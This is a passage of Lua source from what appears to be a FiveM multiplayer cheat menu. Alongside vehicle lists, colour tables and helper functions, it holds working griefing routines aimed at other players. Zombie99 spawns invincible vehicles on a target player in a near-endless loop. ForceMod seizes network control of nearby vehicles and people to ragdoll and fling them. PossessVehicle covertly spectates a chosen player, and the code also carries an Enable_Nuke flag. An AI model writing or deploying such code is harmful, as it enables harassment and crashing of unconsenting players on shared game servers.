    "SANCHEZ",
    "SANCHEZ2",
    "SANCTUS",
    "SHOTARO",
    "SOVEREIGN",
    "THRUST",
    "VADER",
    "VINDICATOR",
    "VORTEX",
    "WOLFSBANE",
    "ZOMBIEA",
    "ZOMBIEB"
}

local offroad = {
    "BFINJECTION",
    "BIFTA",
    "BLAZER",
    "BLAZER2",
    "BLAZER3",
    "BLAZER4",
    "BLAZER5",
    "BODHI2",
    "BRAWLER",
    "BRUISER",
    "BRUISER2",
    "BRUISER3",
    "BRUTUS",
    "BRUTUS2",
    "BRUTUS3",
    "CARACARA",
    "DLOADER",
    "DUBSTA3",
    "DUNE",
    "DUNE2",
    "DUNE3",
    "DUNE4",
    "DUNE5",
    "FREECRAWLER",
    "INSURGENT",
    "INSURGENT2",
    "INSURGENT3",
    "KALAHARI",
    "KAMACHO",
    "MARSHALL",
    "MENACER",
    "MESA3",
    "MONSTER",
    "MONSTER3",
    "MONSTER4",
    "MONSTER5",
    "NIGHTSHARK",
    "RANCHERXL",
    "RANCHERXL2",
    "RCBANDITO",
    "REBEL",
    "REBEL2",
    "RIATA",
    "SANDKING",
    "SANDKING2",
    "TECHNICAL",
    "TECHNICAL2",
    "TECHNICAL3",
    "TROPHYTRUCK",
    "TROPHYTRUCK2"
}

local industrial = {
    "BULLDOZER",
    "CUTTER",
    "DUMP",
    "FLATBED",
    "GUARDIAN",
    "HANDLER",
    "MIXER",
    "MIXER2",
    "RUBBLE",
    "TIPTRUCK",
    "TIPTRUCK2"
}

local utility = {
    "AIRTUG",
    "CADDY",
    "CADDY2",
    "CADDY3",
    "DOCKTUG",
    "FORKLIFT",
    "TRACTOR2",
    "TRACTOR3",
    "MOWER",
    "RIPLEY",
    "SADLER",
    "SADLER2",
    "SCRAP",
    "TOWTRUCK",
    "TOWTRUCK2",
    "TRACTOR",
    "UTILLITRUCK",
    "UTILLITRUCK2",
    "UTILLITRUCK3",
    "ARMYTRAILER",
    "ARMYTRAILER2",
    "FREIGHTTRAILER",
    "ARMYTANKER",
    "TRAILERLARGE",
    "DOCKTRAILER",
    "TR3",
    "TR2",
    "TR4",
    "TRFLAT",
    "TRAILERS",
    "TRAILERS4",
    "TRAILERS2",
    "TRAILERS3",
    "TVTRAILER",
    "TRAILERLOGS",
    "TANKER",
    "TANKER2",
    "BALETRAILER",
    "GRAINTRAILER",
    "BOATTRAILER",
    "RAKETRAILER",
    "TRAILERSMALL"
}

local vans = {
    "BISON",
    "BISON2",
    "BISON3",
    "BOBCATXL",
    "BOXVILLE",
    "BOXVILLE2",
    "BOXVILLE3",
    "BOXVILLE4",
    "BOXVILLE5",
    "BURRITO",
    "BURRITO2",
    "BURRITO3",
    "BURRITO4",
    "BURRITO5",
    "CAMPER",
    "GBURRITO",
    "GBURRITO2",
    "JOURNEY",
    "MINIVAN",
    "MINIVAN2",
    "PARADISE",
    "PONY",
    "PONY2",
    "RUMPO",
    "RUMPO2",
    "RUMPO3",
    "SPEEDO",
    "SPEEDO2",
    "SPEEDO4",
    "SURFER",
    "SURFER2",
    "TACO",
    "YOUGA",
    "YOUGA2"
}

local cycles = {
    "BMX",
    "CRUISER",
    "FIXTER",
    "SCORCHER",
    "TRIBIKE",
    "TRIBIKE2",
    "TRIBIKE3"
}

local boats = {
    "DINGHY",
    "DINGHY2",
    "DINGHY3",
    "DINGHY4",
    "JETMAX",
    "MARQUIS",
    "PREDATOR",
    "SEASHARK",
    "SEASHARK2",
    "SEASHARK3",
    "SPEEDER",
    "SPEEDER2",
    "SQUALO",
    "SUBMERSIBLE",
    "SUBMERSIBLE2",
    "SUNTRAP",
    "TORO",
    "TORO2",
    "TROPIC",
    "TROPIC2",
    "TUG"
}

local helicopters = {
    "AKULA",
    "ANNIHILATOR",
    "BUZZARD",
    "BUZZARD2",
    "CARGOBOB",
    "CARGOBOB2",
    "CARGOBOB3",
    "CARGOBOB4",
    "FROGGER",
    "FROGGER2",
    "HAVOK",
    "HUNTER",
    "MAVERICK",
    "POLMAV",
    "SAVAGE",
    "SEASPARROW",
    "SKYLIFT",
    "SUPERVOLITO",
    "SUPERVOLITO2",
    "SWIFT",
    "SWIFT2",
    "VALKYRIE",
    "VALKYRIE2",
    "VOLATUS"
}


local planes = {
    "ALPHAZ1",
    "AVENGER",
    "AVENGER2",
    "BESRA",
    "BLIMP",
    "BLIMP2",
    "BLIMP3",
    "BOMBUSHKA",
    "CARGOPLANE",
    "CUBAN800",
    "DODO",
    "DUSTER",
    "HOWARD",
    "HYDRA",
    "JET",
    "LAZER",
    "LUXOR",
    "LUXOR2",
    "MAMMATUS",
    "MICROLIGHT",
    "MILJET",
    "MOGUL",
    "MOLOTOK",
    "NIMBUS",
    "NOKOTA",
    "PYRO",
    "ROGUE",
    "SEABREEZE",
    "SHAMAL",
    "STARLING",
    "STRIKEFORCE",
    "STUNT",
    "TITAN",
    "TULA",
    "VELUM",
    "VELUM2",
    "VESTRA",
    "VOLATOL"
}

local service = {
    "AIRBUS",
    "BRICKADE",
    "BUS",
    "COACH",
    "PBUS2",
    "RALLYTRUCK",
    "RENTALBUS",
    "TAXI",
    "TOURBUS",
    "TRASH",
    "TRASH2",
    "WASTELANDER",
    "AMBULANCE",
    "FBI",
    "FBI2",
    "FIRETRUK",
    "LGUARD",
    "PBUS",
    "POLICE",
    "POLICE2",
    "POLICE3",
    "POLICE4",
    "POLICEB",
    "POLICEOLD1",
    "POLICEOLD2",
    "POLICET",
    "POLMAV",
    "PRANGER",
    "PREDATOR",
    "RIOT",
    "RIOT2",
    "SHERIFF",
    "SHERIFF2",
    "APC",
    "BARRACKS",
    "BARRACKS2",
    "BARRACKS3",
    "BARRAGE",
    "CHERNOBOG",
    "CRUSADER",
    "HALFTRACK",
    "KHANJALI",
    "RHINO",
    "SCARAB",
    "SCARAB2",
    "SCARAB3",
    "THRUSTER",
    "TRAILERSMALL2"
}

local commercial = {
    "BENSON",
    "BIFF",
    "CERBERUS",
    "CERBERUS2",
    "CERBERUS3",
    "HAULER",
    "HAULER2",
    "MULE",
    "MULE2",
    "MULE3",
    "MULE4",
    "PACKER",
    "PHANTOM",
    "PHANTOM2",
    "PHANTOM3",
    "POUNDER",
    "POUNDER2",
    "STOCKADE",
    "STOCKADE3",
    "TERBYTE",
    "CABLECAR",
    "FREIGHT",
    "FREIGHTCAR",
    "FREIGHTCONT1",
    "FREIGHTCONT2",
    "FREIGHTGRAIN",
    "METROTRAIN",
    "TANKERCAR"
}

-- END VEHICLES LISTS
-- VEHICLE MODS LIST (this is going to take a while...)
local classicColors = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}

local matteColors = {
    {"Black", 12},
    {"Gray", 13},
    {"Light Gray", 14},
    {"Ice White", 131},
    {"Blue", 83},
    {"Dark Blue", 82},
    {"Midnight Blue", 84},
    {"Midnight Purple", 149},
    {"Schafter Purple", 148},
    {"Red", 39},
    {"Dark Red", 40},
    {"Orange", 41},
    {"Yellow", 42},
    {"Lime Green", 55},
    {"Green", 128},
    {"Forest Green", 151},
    {"Foliage Green", 155},
    {"Olive Darb", 152},
    {"Dark Earth", 153},
    {"Desert Tan", 154}
}

local metalColors = {
    {"Brushed Steel", 117},
    {"Brushed Black Steel", 118},
    {"Brushed Aluminum", 119},
    {"Chrome", 120},
    {"Pure Gold", 158},
    {"Brushed Gold", 159}
}


local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, ["F11"] = 344, 
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 124, ["N5"] = 126, ["N6"] = 125, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}
local Enable_Nuke = false
local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }

vRP = Proxy.getInterface("RP")


local function ForceMod()
    ForceTog = not ForceTog
    
    if ForceTog then
        
        Citizen.CreateThread(function()
            ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode -» KEY ~y~[E] ")
            
            local ForceKey = Keys["E"]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            function forcetick()
                
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                
                end
            
            end
            
            while ForceTog do forcetick()Wait(0) end
        end)
    else ShowInfo("Force Mode ~b~[OFF]") end

end

function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, false) then return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then return i end
        end
    end
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

-- END MENYOO/ENTITY FUNCTIONS
-- DRAWING FUNCTIONS
function ShowMPMessage(message, subtitle, ms)
    Citizen.CreateThread(function()
        Citizen.Wait(0)
        function Initialize(scaleform)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(0)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PushScaleformMovieFunctionParameterString(subtitle)
            PopScaleformMovieFunctionVoid()
            Citizen.SetTimeout(6500, function()
                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                PushScaleformMovieFunctionParameterInt(1)
                PushScaleformMovieFunctionParameterFloat(0.33)
                PopScaleformMovieFunctionVoid()
                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
            end)
            return scaleform
        end
        
        scaleform = Initialize("mp_big_message_freemode")
        
        while true do
            Citizen.Wait(0)
            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
        end
    end)
end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

    function Zombie99(player)  
        Citizen.CreateThread(function() 
            RequestModelSync("Tug") 
            count = 0
            for b = 0, 1000000000000000 do 
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
                local v = CreateVehicle(GetHashKey("Tug"), x, y, z, 0.0, true, true)				
                SetEntityInvincible(v, true) count = count - 0.4
				Citizen.Wait(10)
				DeletePed(v)
			end	 
		end)    
    end		

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
    
    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov
    
    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

local function GetHeadItems()
    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
    local faceItemsList = {}
    for i = 1, headItems do
        faceItemsList[i] = i
    end
	return faceItemsList
end

local function GetHeadTextures(faceID)
    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
	local headTexturesList = {}
    for i = 1, headTextures do
        headTexturesList[i] = i
    end
	return headTexturesList
end

local function GetHairItems()
    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
    local hairItemsList = {}
    for i = 1, hairItems do
        hairItemsList[i] = i
    end
    return hairItemsList
end

local function GetHairTextures(hairID)
    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
    local hairTextureList = {}
    for i = 1, hairTexture do
        hairTextureList[i] = i
    end
    return hairTextureList
end

local function GetMaskItems()
    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
    local maskItemsList = {}
    for i = 1, maskItems do
        maskItemsList[i] = i
    end
	return maskItemsList
end

local function GetHatItems()
    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
    local hatItemsList = {}
    for i = 1, hatItems do
        hatItemsList[i] = i
    end
	return hatItemsList
end

local function GetHatTextures(hatID)
	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
	local hatTexturesList = {}
	for i = 1, hatTextures do
        hatTexturesList[i] = i
    end
	return hatTexturesList
end

local function ClonePed(target)
        local ped = GetPlayerPed(target)
        local me = PlayerPedId()

        hat = GetPedPropIndex(ped, 0)
        hat_texture = GetPedPropTextureIndex(ped, 0)

        glasses = GetPedPropIndex(ped, 1)
        glasses_texture = GetPedPropTextureIndex(ped, 1)

        ear = GetPedPropIndex(ped, 2)
        ear_texture = GetPedPropTextureIndex(ped, 2)

        watch = GetPedPropIndex(ped, 6)
        watch_texture = GetPedPropTextureIndex(ped, 6)

        wrist = GetPedPropIndex(ped, 7)
        wrist_texture = GetPedPropTextureIndex(ped, 7)

        head_drawable = GetPedDrawableVariation(ped, 0)
        head_palette = GetPedPaletteVariation(ped, 0)
        head_texture = GetPedTextureVariation(ped, 0)

        beard_drawable = GetPedDrawableVariation(ped, 1)
        beard_palette = GetPedPaletteVariation(ped, 1)
        beard_texture = GetPedTextureVariation(ped, 1)

        hair_drawable = GetPedDrawableVariation(ped, 2)
        hair_palette = GetPedPaletteVariation(ped, 2)
        hair_texture = GetPedTextureVariation(ped, 2)

        torso_drawable = GetPedDrawableVariation(ped, 3)
        torso_palette = GetPedPaletteVariation(ped, 3)
        torso_texture = GetPedTextureVariation(ped, 3)

        legs_drawable = GetPedDrawableVariation(ped, 4)
        legs_palette = GetPedPaletteVariation(ped, 4)
        legs_texture = GetPedTextureVariation(ped, 4)

        hands_drawable = GetPedDrawableVariation(ped, 5)
        hands_palette = GetPedPaletteVariation(ped, 5)
        hands_texture = GetPedTextureVariation(ped, 5)

        foot_drawable = GetPedDrawableVariation(ped, 6)
        foot_palette = GetPedPaletteVariation(ped, 6)
        foot_texture = GetPedTextureVariation(ped, 6)

        acc1_drawable = GetPedDrawableVariation(ped, 7)
        acc1_palette = GetPedPaletteVariation(ped, 7)
        acc1_texture = GetPedTextureVariation(ped, 7)

        acc2_drawable = GetPedDrawableVariation(ped, 8)
        acc2_palette = GetPedPaletteVariation(ped, 8)
        acc2_texture = GetPedTextureVariation(ped, 8)

        acc3_drawable = GetPedDrawableVariation(ped, 9)
        acc3_palette = GetPedPaletteVariation(ped, 9)
        acc3_texture = GetPedTextureVariation(ped, 9)

        mask_drawable = GetPedDrawableVariation(ped, 10)
        mask_palette = GetPedPaletteVariation(ped, 10)
        mask_texture = GetPedTextureVariation(ped, 10)

        aux_drawable = GetPedDrawableVariation(ped, 11)
        aux_palette = GetPedPaletteVariation(ped, 11)
        aux_texture = GetPedTextureVariation(ped, 11)

        SetPedPropIndex(me, 0, hat, hat_texture, 1)
        SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
        SetPedPropIndex(me, 2, ear, ear_texture, 1)
        SetPedPropIndex(me, 6, watch, watch_texture, 1)
        SetPedPropIndex(me, 7, wrist, wrist_texture, 1)

        SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
        SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
        SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
        SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
        SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
        SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
        SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
        SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
        SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
        SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
        SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
        SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end


local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
    end)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

function table.removekey(array, element)
    for i = 1, #array do
        if array[i] == element then
            table.remove(array, i)
        end
    end
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function GetKeyboardInput(text)
	if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)

        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        Wait(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        Wait(0)
        return result
    end
end

function SpectatePlayer(id)
    local player = GetPlayerPed(id)
    if Spectating then
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(true, player)
    else
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(false, player)
    end
end

local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end

local function PossessVehicle(target)
    PossessingVeh = not PossessingVeh
    
    if not PossessingVeh then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), oldPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
    else
        SpectatePlayer(selectedPlayer)
        ShowInfo("~b~Checking Player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            SpectatePlayer(selectedPlayer)
            oldPlayerPos = GetEntityCoords(PlayerPedId())
            SetEntityVisible(PlayerPedId(), false, 0)
            SetEntityCollision(PlayerPedId(), false, 0)
        else
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~b~Player not in a vehicle!  (Try again?)")
        end
        
        
        local Markerloc = nil
        

        Citizen.CreateThread(function()
            local ped = GetPlayerPed(target)
            local veh = GetVehiclePedIsIn(ped, 0)
            
            while PossessingVeh do
                
                DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
